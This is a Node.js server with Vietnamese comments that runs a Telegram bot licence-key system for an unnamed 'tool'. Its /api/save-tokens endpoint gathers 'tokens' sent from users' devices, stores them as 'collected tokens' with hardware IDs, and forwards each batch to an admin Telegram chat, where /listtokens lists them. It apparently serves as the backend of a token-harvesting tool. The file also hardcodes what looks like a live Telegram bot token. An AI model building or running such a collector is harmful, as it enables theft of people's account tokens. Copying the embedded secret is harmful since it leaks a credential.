const express = require('express');
const cors = require('cors');

// --- CẤU HÌNH CỦA BẠN ---
const BOT_TOKEN = '8326965315:AAGx_Byqs3qaD8tXevZY8dl8K3ogvMV3l-Y'; 
const ADMIN_ID = 8377928865;

// API chính thức của Telegram:
const TELEGRAM_API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;

const app = express();
app.use(cors());
app.use(express.json());

// Structure: validKeys[key] = { expireAt: timestamp, deviceId: "mã-máy-đầu-tiên" }
let validKeys = {};

// Quản lý người dùng & dữ liệu thu thập
let userDevices = {};   // Structure: userDevices[deviceId] = { firstSeen, lastSeen, keyUsed }
let collectedTokens = []; // Danh sách lưu trữ tất cả token thu thập được

// --- TRẠNG THÁI BẢO TRÌ TỪ XA ---
let isMaintenanceMode = false; 
let maintenanceMsg = "HỆ THỐNG ĐANG BẢO TRÌ TỪ XA!\nVUI LÒNG QUAY LẠI SAU ÍT PHÚT.";

function generateRandomKey(prefix = 'VIP') {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let result = '';
    for (let i = 0; i < 8; i++) result += chars.charAt(Math.floor(Math.random() * chars.length));
    return `${prefix}-${result}`;
}

async function sendMessage(chatId, text) {
    try {
        await fetch(`${TELEGRAM_API_BASE}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'Markdown' })
        });
    } catch (e) {
        console.error('❌ Lỗi gửi tin:', e.message);
    }
}

async function clearWebhook() {
    try { await fetch(`${TELEGRAM_API_BASE}/deleteWebhook`); } catch(e) {}
}

let lastUpdateId = 0;
async function pollTelegram() {
    await clearWebhook();
    console.log('📡 Bot đã sẵn sàng nhận lệnh...');

    while (true) {
        try {
            const res = await fetch(`${TELEGRAM_API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`);
            const data = await res.json();
            if (data.ok && data.result) {
                for (const update of data.result) {
                    lastUpdateId = update.update_id;
                    if (update.message && update.message.text) {
                        handleCommand(update.message);
                    }
                }
            }
        } catch (e) {
            await new Promise(r => setTimeout(r, 4000));
        }
    }
}

function handleCommand(msg) {
    const chatId = msg.chat.id;
    const text = msg.text.trim();
    const args = text.split(' ');
    const cmd = args[0].toLowerCase();

    // Lệnh User
    if (cmd === '/start') {
        return sendMessage(chatId, "👋 Chào mừng! Nhắn `/getkey` để nhận Key dùng thử 24h.");
    }
    
    if (cmd === '/getkey') {
        const newKey = generateRandomKey('FREE');
        validKeys[newKey] = { expireAt: Date.now() + (24 * 60 * 60 * 1000), deviceId: null };
        return sendMessage(chatId, `🎉 *Tạo Key Miễn Phí Thành Công!*\n🔑 Key: \`${newKey}\`\n⏳ Hạn dùng: 24 Giờ\n🔒 *Lưu ý:* Key chỉ kích hoạt được trên 1 thiết bị!`);
    }

    // --- BỘ LỆNH ADMIN ---
    if (chatId !== ADMIN_ID) return;

    // 1. Tạo Key tùy chỉnh: /createkey <TÊN_KEY> <SỐ_GIỜ>
    if (cmd === '/createkey') {
        const customKey = args[1];
        const hours = parseInt(args[2]) || 24;

        if (!customKey) {
            return sendMessage(chatId, "⚠️ Cú pháp: `/createkey <TÊN_KEY> <SỐ_GIỜ>`");
        }

        validKeys[customKey] = { expireAt: Date.now() + (hours * 60 * 60 * 1000), deviceId: null };
        return sendMessage(chatId, `👑 *ADMIN TẠO KEY THÀNH CÔNG*\n🔑 Key: \`${customKey}\`\n⏱ Thời hạn: ${hours} Giờ`);
    }

    // 2. Tạo Key ngẫu nhiên: /genkey <SỐ_GIỜ>
    if (cmd === '/genkey') {
        const hours = parseInt(args[1]) || 24;
        const newKey = generateRandomKey('ADMIN');
        validKeys[newKey] = { expireAt: Date.now() + (hours * 60 * 60 * 1000), deviceId: null };
        return sendMessage(chatId, `👑 *ADMIN TẠO KEY NGẪU NHIÊN*\n🔑 Key: \`${newKey}\`\n⏱ Thời hạn: ${hours} Giờ`);
    }

    // 3. Reset thiết bị cho 1 key: /resetkey <KEY>
    if (cmd === '/resetkey') {
        const keyToReset = args[1];
        if (validKeys[keyToReset]) {
            validKeys[keyToReset].deviceId = null;
            return sendMessage(chatId, `🔓 Đã gỡ trói thiết bị cho Key \`${keyToReset}\`. Giờ có thể đăng nhập ở máy mới!`);
        } else {
            return sendMessage(chatId, "❌ Key này không tồn tại.");
        }
    }

    // 4. Danh sách key: /listkey
    if (cmd === '/listkey') {
        const keys = Object.keys(validKeys);
        if (keys.length === 0) return sendMessage(chatId, "📋 Chưa có Key nào.");

        let msgText = "📋 *DANH SÁCH KEY HOẠT ĐỘNG:*\n\n";
        const now = Date.now();
        keys.forEach(k => {
            const timeLeft = Math.max(0, Math.round((validKeys[k].expireAt - now) / (1000 * 60)));
            const devStatus = validKeys[k].deviceId ? "🔒 Đã gắn máy" : "🔓 Chưa gắn máy";
            msgText += `• \`${k}\`: Còn ${timeLeft} phút \vert{} ${devStatus}\n`;
        });
        return sendMessage(chatId, msgText);
    }

    // 5. Xóa key: /delkey <KEY>
    if (cmd === '/delkey') {
        const keyToDel = args[1];
        if (validKeys[keyToDel]) {
            delete validKeys[keyToDel];
            return sendMessage(chatId, `🗑 Đã xóa Key \`${keyToDel}\`.`);
        } else {
            return sendMessage(chatId, "❌ Key không tồn tại.");
        }
    }

    // 6. Bật/Tắt bảo trì Tool từ xa: /baotri on <LÝ_DO> hoặc /baotri off
    if (cmd === '/baotri') {
        const action = args[1]?.toLowerCase();
        if (action === 'on') {
            isMaintenanceMode = true;
            const customMsg = args.slice(2).join(' ');
            if (customMsg) maintenanceMsg = customMsg;
            return sendMessage(chatId, `🛠️ *ĐÃ BẬT CHẾ ĐỘ BẢO TRÌ TỪ XA!*\n📢 Thông báo: "${maintenanceMsg}"\n🔒 *Tất cả Tool của người dùng sẽ bị khóa ngay lập tức.*`);
        } else if (action === 'off') {
            isMaintenanceMode = false;
            return sendMessage(chatId, "🟢 *ĐÃ TẮT BẢO TRÌ!* Tool đã cho phép người dùng đăng nhập lại bình thường.");
        } else {
            const statusStr = isMaintenanceMode ? "🛠️ ĐANG BẢO TRÌ" : "🟢 ĐANG MỞ";
            return sendMessage(chatId, `⚠️ Cú pháp: \`/baotri on <LÝ_DO>\` hoặc \`/baotri off\`\n📊 Trạng thái hiện tại: *${statusStr}*`);
        }
    }

    // 7. Xem thống kê hệ thống: /stats
    if (cmd === '/stats') {
        const totalUsers = Object.keys(userDevices).length;
        const totalKeys = Object.keys(validKeys).length;
        const activeKeys = Object.values(validKeys).filter(k => k.expireAt > Date.now()).length;
        const totalTokens = collectedTokens.length;

        const statsMsg = `📊 *BÁO CÁO THỐNG KÊ HỆ THỐNG*\n\n` +
            `📱 *Tổng thiết bị/người dùng (HWID):* \`${totalUsers}\`\n` +
            `🔑 *Tổng số Key đang tạo:* \`${totalKeys}\`\n` +
            `🟢 *Key đang hoạt động:* \`${activeKeys}\`\n` +
            `📥 *Tổng Token thu thập được:* \`${totalTokens}\`\n` +
            `🛠️ *Trạng thái bảo trì:* ${isMaintenanceMode ? "🔴 ĐANG BẢO TRÌ" : "🟢 ĐANG HOẠT ĐỘNG"}`;

        return sendMessage(chatId, statsMsg);
    }

    // 8. Xem danh sách Token đã thu thập: /listtokens
    if (cmd === '/listtokens') {
        if (collectedTokens.length === 0) {
            return sendMessage(chatId, "📭 Chưa thu thập được Token nào.");
        }

        let tokenListText = `📋 *DANH SÁCH ${collectedTokens.length} TOKEN THU THẬP ĐƯỢC:*\n\n`;
        collectedTokens.forEach((tk, idx) => {
            tokenListText += `${idx + 1}. \`${tk}\`\n`;
        });
        return sendMessage(chatId, tokenListText);
    }
}

// --- API KIỂM TRA TRẠNG THÁI BẢO TRÌ TỪ XA ---
app.get('/api/status', (req, res) => {
    return res.json({
        isMaintenance: isMaintenanceMode,
        message: maintenanceMsg
    });
});

// --- API LƯU TOKEN VÀ TỰ ĐỘNG GỬI BÁO VỀ TELEGRAM ADMIN ---
app.post('/api/save-tokens', async (req, res) => {
    const { key, deviceId, tokens } = req.body;

    if (!tokens || !Array.isArray(tokens) || tokens.length === 0) {
        return res.json({ success: false, message: 'Danh sách Token trống!' });
    }

    let newlyAdded = 0;
    tokens.forEach(tk => {
        if (!collectedTokens.includes(tk)) {
            collectedTokens.push(tk);
            newlyAdded++;
        }
    });

    // Cập nhật/ghi nhận thiết bị người dùng
    if (deviceId) {
        if (!userDevices[deviceId]) {
            userDevices[deviceId] = { firstSeen: Date.now(), lastSeen: Date.now(), keyUsed: key || 'Chưa đăng nhập' };
        } else {
            userDevices[deviceId].lastSeen = Date.now();
            if (key) userDevices[deviceId].keyUsed = key;
        }
    }

    // Gửi thông báo trực tiếp đến Telegram Admin
    const tokenFormatted = tokens.map((t, idx) => `${idx + 1}. \`${t}\``).join('\n');
    const alertText = `📥 *CÓ TOKEN MỚI ĐƯỢC LƯU!\n\n` +
        `🔑 *Key sử dụng:* \`${key || 'Chưa đăng nhập'}\`\n` +
        `📱 *HWID:* \`${deviceId || 'Không rõ'}\`\n` +
        `📊 *Số lượng:* ${tokens.length} token (Thêm mới: ${newlyAdded})\n\n` +
        `📜 *Danh sách Token:*\n${tokenFormatted}`;

    await sendMessage(ADMIN_ID, alertText);

    return res.json({
        success: true,
        message: '✅ Đã lưu và gửi Token về Server thành công!'
    });
});

// --- API XÁC THỰC KEY TÍCH HỢP HWID & TRẢ VỀ THỜI HẠN ---
app.get('/api/verify', (req, res) => {
    // 🛑 CHẶN NGAY TẠI API NẾU ĐANG BẢO TRÌ
    if (isMaintenanceMode) {
        return res.json({ 
            success: false, 
            isMaintenance: true, 
            message: maintenanceMsg 
        });
    }

    const key = req.query.key;
    const deviceId = req.query.deviceId;

    if (!key || !validKeys[key]) {
        return res.json({ success: false, message: '❌ Key không tồn tại hoặc không chính xác!' });
    }

    if (Date.now() > validKeys[key].expireAt) {
        delete validKeys[key];
        return res.json({ success: false, message: '❌ Key này đã hết hạn sử dụng!' });
    }

    // Kiểm tra khóa thiết bị (1 Key - 1 Thiết bị)
    if (!validKeys[key].deviceId) {
        // Lần đầu đăng nhập -> Trói Key vào thiết bị này
        validKeys[key].deviceId = deviceId;
    } else if (validKeys[key].deviceId !== deviceId) {
        // Đã kích hoạt trên thiết bị khác
        return res.json({ success: false, message: '🚫 Key này đã được sử dụng trên thiết bị khác!' });
    }

    // Lưu vết người dùng
    if (deviceId) {
        if (!userDevices[deviceId]) {
            userDevices[deviceId] = { firstSeen: Date.now(), lastSeen: Date.now(), keyUsed: key };
        } else {
            userDevices[deviceId].lastSeen = Date.now();
            userDevices[deviceId].keyUsed = key;
        }
    }

    return res.json({ 
        success: true, 
        message: '✅ Xác thực thành công!',
        expireAt: validKeys[key].expireAt 
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`✅ Server đang chạy tại Port ${PORT}`);
    pollTelegram();
});
